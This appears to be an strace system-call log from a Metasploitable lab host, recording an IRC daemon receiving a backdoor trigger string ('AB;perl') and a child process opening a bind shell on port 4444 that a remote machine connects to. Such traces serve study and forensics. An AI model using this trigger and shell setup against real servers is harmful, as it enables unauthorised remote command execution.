10891 07:35:08.715053 stat64("/lib/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715064 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715076 stat64("/lib/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715087 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715099 stat64("/lib/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715110 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715121 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10891 07:35:08.715138 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715151 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715163 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715176 stat64("/usr/lib/tls/i686/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715187 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715200 stat64("/usr/lib/tls/i686/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715212 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715224 stat64("/usr/lib/tls/i686", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715235 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715248 stat64("/usr/lib/tls/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715259 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715272 stat64("/usr/lib/tls/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715283 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715296 stat64("/usr/lib/tls/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715307 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715319 stat64("/usr/lib/tls", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715330 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715343 stat64("/usr/lib/i686/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715355 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715367 stat64("/usr/lib/i686/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715379 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715392 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10891 07:35:08.715409 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715421 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10891 07:35:08.715438 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715451 stat64("/usr/lib/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715462 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715474 stat64("/usr/lib/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715492 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715508 stat64("/usr/lib/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715520 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715531 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
10891 07:35:08.715548 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715562 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715575 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715588 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715601 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715614 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715626 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715639 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715651 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715665 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715677 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715690 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715702 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715715 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715727 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715739 stat64("/lib/i486-linux-gnu/tls", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715751 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715764 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715777 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715790 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715802 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715815 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715827 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715840 stat64("/lib/i486-linux-gnu/i686", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715851 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715865 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715877 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715889 stat64("/lib/i486-linux-gnu/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715901 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715914 stat64("/lib/i486-linux-gnu/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715926 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715938 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10891 07:35:08.715958 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.715980 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.715996 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716010 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716023 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716036 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716049 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716062 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716075 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716089 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716101 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716114 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716127 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716140 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716153 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716166 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716178 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716191 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716204 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716217 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716230 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716243 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716256 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716269 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716281 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716294 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716307 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716320 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716332 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716345 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfbc085c) = -1 ENOENT (No such file or directory)
10891 07:35:08.716357 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10891 07:35:08.716370 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10891 07:35:08.716390 munmap(0xb7dd5000, 29913) = 0
10891 07:35:08.716411 open("/etc/ld.so.cache", O_RDONLY) = 5
10891 07:35:08.716423 fstat64(5, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10891 07:35:08.716443 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7dd5000
10891 07:35:08.716454 close(5)          = 0
10891 07:35:08.716464 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10891 07:35:08.716488 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 5
10891 07:35:08.716504 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10891 07:35:08.716595 fstat64(5, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10891 07:35:08.716617 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7dca000
10891 07:35:08.716629 mmap2(0xb7dd3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x8) = 0xb7dd3000
10891 07:35:08.716648 close(5)          = 0
10891 07:35:08.716672 munmap(0xb7dd5000, 29913) = 0
10891 07:35:08.716688 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 5
10891 07:35:08.716706 fcntl64(5, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10891 07:35:08.716723 fstat64(5, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10891 07:35:08.716740 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ddc000
10891 07:35:08.716751 read(5, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10891 07:35:08.716941 close(5)          = 0
10891 07:35:08.716951 munmap(0xb7ddc000, 4096) = 0
10891 07:35:08.716977 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 5
10891 07:35:08.716993 fstat64(5, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10891 07:35:08.717010 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ddc000
10891 07:35:08.717021 read(5, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10891 07:35:08.717200 close(5)          = 0
10891 07:35:08.717210 munmap(0xb7ddc000, 4096) = 0
10891 07:35:08.717238 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 5
10891 07:35:08.717259 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0d68) = -1 EINVAL (Invalid argument)
10891 07:35:08.717272 _llseek(5, 0, 0xbfbc0db0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10891 07:35:08.717284 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0d68) = -1 EINVAL (Invalid argument)
10891 07:35:08.717295 _llseek(5, 0, 0xbfbc0db0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10891 07:35:08.717305 fcntl64(5, F_SETFD, FD_CLOEXEC) = 0
10891 07:35:08.717356 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
10891 07:35:08.717391 bind(5, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
10891 07:35:08.717417 listen(5, 5)      = 0
10891 07:35:08.717478 accept(5,  <unfinished ...>
10890 07:35:08.717706 exit_group(0)     = ?
10888 07:35:08.717781 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10890
10888 07:35:08.717798 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10888 07:35:08.717811 --- SIGCHLD (Child exited) @ 0 (0) ---
10888 07:35:08.717823 waitpid(-1, 0xbf9c6d38, WNOHANG) = -1 ECHILD (No child processes)
10888 07:35:08.717834 sigreturn()       = ? (mask now [])
10888 07:35:08.717850 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10888 07:35:08.717892 exit_group(0)     = ?
4519  07:35:08.717928 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10888
4519  07:35:08.717952 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:35:08.717968 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:35:08.717978 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:35:08.717988 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:35:08.718007 send(6, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:35:08.718069 time(NULL)        = 1495625708
4519  07:35:08.718080 time(NULL)        = 1495625708
4519  07:35:08.718093 gettimeofday({1495625708, 718097}, NULL) = 0
4519  07:35:08.718107 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:35:08.718137 clock_gettime(CLOCK_MONOTONIC, {2518, 535150998}) = 0
4519  07:35:08.718150 gettimeofday({1495625708, 718154}, NULL) = 0
4519  07:35:08.718161 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0} <unfinished ...>
10891 07:35:09.100940 <... accept resumed> {sa_family=AF_INET, sin_port=htons(44845), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
10891 07:35:09.101016 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbbfd58) = -1 EINVAL (Invalid argument)
10891 07:35:09.101031 _llseek(8, 0, 0xbfbbfda0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10891 07:35:09.101044 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbbfd58) = -1 EINVAL (Invalid argument)
10891 07:35:09.101055 _llseek(8, 0, 0xbfbbfda0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10891 07:35:09.101065 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
10891 07:35:09.101121 close(5)          = 0
10891 07:35:09.101190 dup(8)            = 5
10891 07:35:09.101203 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0bf8) = -1 EINVAL (Invalid argument)
10891 07:35:09.101214 _llseek(5, 0, 0xbfbc0c40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10891 07:35:09.101224 fstat64(5, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10891 07:35:09.101244 dup2(5, 1)        = 1
10891 07:35:09.101255 close(5)          = 0
10891 07:35:09.101266 fcntl64(1, F_SETFD, 0) = 0
10891 07:35:09.101276 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0bc8) = -1 EINVAL (Invalid argument)
10891 07:35:09.101287 _llseek(1, 0, 0xbfbc0c10, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10891 07:35:09.101363 dup(8)            = 5
10891 07:35:09.101377 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0bf8) = -1 EINVAL (Invalid argument)
10891 07:35:09.101389 _llseek(5, 0, 0xbfbc0c40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10891 07:35:09.101415 fstat64(5, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10891 07:35:09.101445 dup2(5, 0)        = 0
10891 07:35:09.101455 close(5)          = 0
10891 07:35:09.101464 fcntl64(0, F_SETFD, 0) = 0
10891 07:35:09.101484 fcntl64(0, F_SETFD, 0) = 0
10891 07:35:09.101500 read(0,  <unfinished ...>
4519  07:35:09.101928 <... select resumed> ) = 1 (in [6], left {0, 620000})
4519  07:35:09.101953 clock_gettime(CLOCK_MONOTONIC, {2518, 918966944}) = 0
4519  07:35:09.101968 recv(6, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:35:09.101996 getsockopt(6, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
